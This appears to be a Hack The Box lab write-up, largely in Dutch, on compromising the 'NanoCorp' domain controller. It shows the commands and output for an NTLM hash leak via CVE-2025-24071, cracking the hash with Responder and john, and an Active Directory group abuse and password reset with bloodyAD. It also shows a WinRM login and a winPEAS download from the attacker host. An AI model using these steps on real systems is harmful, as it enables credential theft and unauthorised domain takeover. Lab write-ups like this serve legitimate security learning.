# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/NanoCorp]
└─$ nmap 10.129.30.97              
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5986/tcp open  wsmans
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/NanoCorp]
└─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986 -sCV 10.129.30.97
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-10 18:55:13Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-11-10T18:56:12+00:00; +2h55m30s from scanner time.
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h55m27s, deviation: 3s, median: 2h55m24s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-10T18:55:27
|_  start_date: N/A

```

Ik ben alle nodige gegevens gaan toevoegen aan de hosts file en ben daarna naar de webpagina geweest. Daar kom je op de volgende pagina terecht.

![[Pasted image 20251110155410.png]]

Je kan zien als je op de About us klikt dat je een nieuwe subdomain te zien krijgt. Het subdomain `hire.nanocorp.htb` zullen we gaan toevoegen aan de hosts file. Als je nu de pagina refreshed zal je kunnen zien dat je op een join pagina terecht komt. Op deze pagina zal je een zip file kunnen downloaden.

![[Pasted image 20251110155619.png]]

Ik ben gaan zoeken naar een exploit en ben terecht gekomen op een NTLM hash leak via ZIP extraction https://github.com/0x6rss/CVE-2025-24071_PoC. Ik ben dus als eerst de zip gaan aanmaken door de volgende commando te gaan gebruiken. Eens dat de zip aangemaakt was ben ik deze eerst gaan proberen uploaden als zip in de webpagina. Maar daar gebeurde er niets als ik mijn responder of http.server op had gezet. Dus ben ik zoals in het voorbeeld in de github page deze naar mijn eigen windows machine gaan downloaden en heb ik deze daar geextract en hier kreeg ik de NTLM hash van de web_svc gebruiker te zien.

```
┌──(kali㉿kali)-[~/HTB/NanoCorp]
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
Cloning into 'CVE-2025-24071_PoC'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 6.30 KiB | 6.30 MiB/s, done.
Resolving deltas: 100% (4/4), done.

┌──(kali㉿kali)-[~/HTB/NanoCorp/CVE-2025-24071_PoC]
└─$ python3 poc.py
Enter your file name: documents  
Enter IP (EX: 192.168.1.162): 10.10.16.20
completed
```

Starten van de responder en extracten van de zip folder.

```
┌──(kali㉿kali)-[~/HTB/NanoCorp/CVE-2025-24071_PoC]
└─$ sudo responder -I tun0 -v
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.20]
    Responder IPv6             [dead:beef:4::1012]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-JCQ6R32TNQ1]
    Responder Domain Name      [M4MU.LOCAL]
    Responder DCE-RPC Port     [49263]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:edbc8fb600b398ea:FCA9608F17420C51834BFC7BEB42A9F9:0101000000000000808241997952DC01FD0B7656C69CBEBC00000000020008004D0034004D00550001001E00570049004E002D004A0043005100360052003300320054004E005100310004003400570049004E002D004A0043005100360052003300320054004E00510031002E004D0034004D0055002E004C004F00430041004C00030014004D0034004D0055002E004C004F00430041004C00050014004D0034004D0055002E004C004F00430041004C0007000800808241997952DC0106000400020000000800300030000000000000000000000000200000E4F34F552FD450574C849CAA39585EB8AB3BFD22CB31D167568C428214E3AECF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320030000000000000000000
```

Ik ben de hash van de user in een file gaan zetten en ben deze gaan cracken door de tool john te gebruiken. Zoals je hieronder zult kunnen zien heb ik de usercredentials van de web_svc gebruiker.

```
┌──(kali㉿kali)-[~/HTB/NanoCorp/CVE-2025-24071_PoC]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
dksehdgh712!@#   (web_svc)     
Session completed.
```

Ik ben de credentials gaan gebruiken voor de gegevens van de ldap server te halen. Dit door het volgende commando te gebruiken: 

```
┌──(kali㉿kali)-[~/HTB/NanoCorp/CVE-2025-24071_PoC]
└─$ nxc ldap 10.129.243.199 -u 'web_svc' -p 'dksehdgh712!@#' --bloodhound --collection All --dns-server 10.129.243.199
 /home/kali/.nxc/logs/DC01_10.129.243.199_2025-11-10_195253_bloodhound.zip
```

zoals je hieronder het path kunt zien voor connectie te krijgen met de windows machine.

![[Pasted image 20251110163644.png]]
Dus ik zal hieronder eerst mijn eigen gaan toevoegen aan de IT_support group. Daarna zal ik het password van de monitoring_svc user gaan veranderen en zal ik via poort 5986 gaan inloggen op de win machine. De normale evil-winrm tool werkte niet dus ben ik een tool gaan downloaden van het internet. https://github.com/ozelis/winrmexec
```
┌──(kali㉿kali)-[~/HTB/NanoCorp]
└─$ bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k add groupMember IT_SUPPORT web_svc
[+] web_svc added to IT_SUPPORT

┌──(kali㉿kali)-[~/HTB/NanoCorp]
└─$ bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k set password monitoring_svc 'Test123'
[+] Password changed successfully!

┌──(kali㉿kali)-[~/HTB/NanoCorp/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 NANOCORP.HTB/monitoring_svc:'Test123'@dc01.nanocorp.htb -k
[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGT for NANOCORP.HTB\monitoring_svc
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\monitoring_svc\Documents>
```


```
Invoke-WebRequest -Uri "http://10.10.16.53:8000/winPEASx64.exe" -OutFile "C:\Users\monitoring_svc\Downloads\winPEASx64.exe" -UseBasicParsing

PS C:\Users\monitoring_svc\Downloads> ./winPEASx64.exe                                                             
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                    
        (((((((((((((((((((((((((((((((((((((((((((                                                                
      ((((((((((((((**********/##########(((((((((((((                                                             
    ((((((((((((********************/#######(((((((((((                                                            
    ((((((((******************/@@@@@/****######((((((((((                                                          
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                        
    (((((********************/@@@@@%@@@@/********##(((((((((                                                       
    (((############*********/%@@@@@@@@@/************((((((((                                                       
    ((##################(/******/@@@@@/***************((((((                                                       
    ((#########################(/**********************(((((                                                       
    ((##############################(/*****************(((((                                                       
    ((###################################(/************(((((                                                       
    ((#######################################(*********(((((                                                       
    ((#######(,.***.,(###################(..***.*******(((((                                                       
    ((#######*(#####((##################((######/(*****(((((                                                       
    ((###################(/***********(##############()(((((                                                       
    (((#####################/*******(################)((((((                                                       
    ((((############################################)((((((                                                        
    (((((##########################################)(((((((                                                        
    ((((((########################################)(((((((                                                         
    ((((((((####################################)((((((((                                                          
    (((((((((#################################)(((((((((                                                           
        ((((((((((##########################)(((((((((                                                             
              ((((((((((((((((((((((((((((((((((((((                                                               
                 ((((((((((((((((((((((((((((((                                                                    

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                        
                                                                                                                   
  WinPEAS-ng by @carlospolopm                                                                                      

       /---------------------------------------------------------------------------------\                         
       |                             Do you like PEASS?                                  |                         
       |---------------------------------------------------------------------------------|                         
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                         
       |         Follow on Twitter         :     @carlospolopm                           |                         
       |         Respect on HTB            :     SirBroccoli                             |                         
       |---------------------------------------------------------------------------------|                         
       |                                 Thank you!                                      |                         
       \---------------------------------------------------------------------------------/                         
                                                                                                                   
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation                                                                                                 
   Creating Dynamic lists, this could take a while, please wait...                                                 
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()                                                                     
   at System.Management.ManagementScope.Initialize()                                                               
   at System.Management.ManagementObjectSearcher.Initialize()                                                      
   at System.Management.ManagementObjectSearcher.Get()                                                             
   at winPEAS.Checks.Checks.CreateDynamicLists()                                                                   
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                                  
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).                                                                                                 

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
                                                                                                                   
    Last Shutdown Date/time        :    11/4/2025 3:21:02 PM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: DC01
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\monitoring_svc\AppData\Local
    PSModulePath: C:\Users\monitoring_svc\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\monitoring_svc\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\monitoring_svc
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0101
    USERNAME: monitoring_svc
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\MONITO~1\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\monitoring_svc\AppData\Roaming
    TMP: C:\Users\MONITO~1\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: NANOCORP
    USERDNSDOMAIN: NANOCORP.HTB

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest                                                                             
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                                                       
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                                                     
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                                      
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                        
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.                                                      

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.20348.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 10240
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 4 GB)(Permissions: Users [AppendData/CreateDirectories])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (NANOCORP) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
                                                                                                                   
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       724
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                   

  NTLM Signing Settings                                                                                            
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                 
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                   

  NTLM Auditing and Restrictions                                                                                   
      InboundRestrictions     : 0 (Allow all)
      OutboundRestrictions    : 0 (Allow all)
      InboundAuditing         :  (Allow all)
      OutboundExceptions      : 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  RpcProxy\49671                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)

  RpcProxy\593                                                                                         Everyone [WriteData/CreateFiles]                                       O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)

  vgauth-service                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)   


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\Program Files\Windows Defender\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
                                                                                                                   


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                                                                                            
                                                                                                                   
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                   
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                   
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                   
  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
                                                                                                                   
System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                                                                
  [X] Exception: Object reference not set to an instance of an object.
  Current user: monitoring_svc
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, Protected Users, Authentication authority asserted identity
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     NANOCORP\monitoring_svc
   Idle Time      :     01h:00m:57s:734ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                    
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   DC01
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   11/12/2025 6:38:22 PM
   Logons Count            :   845
   Password Last Set       :   4/9/2025 3:00:49 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
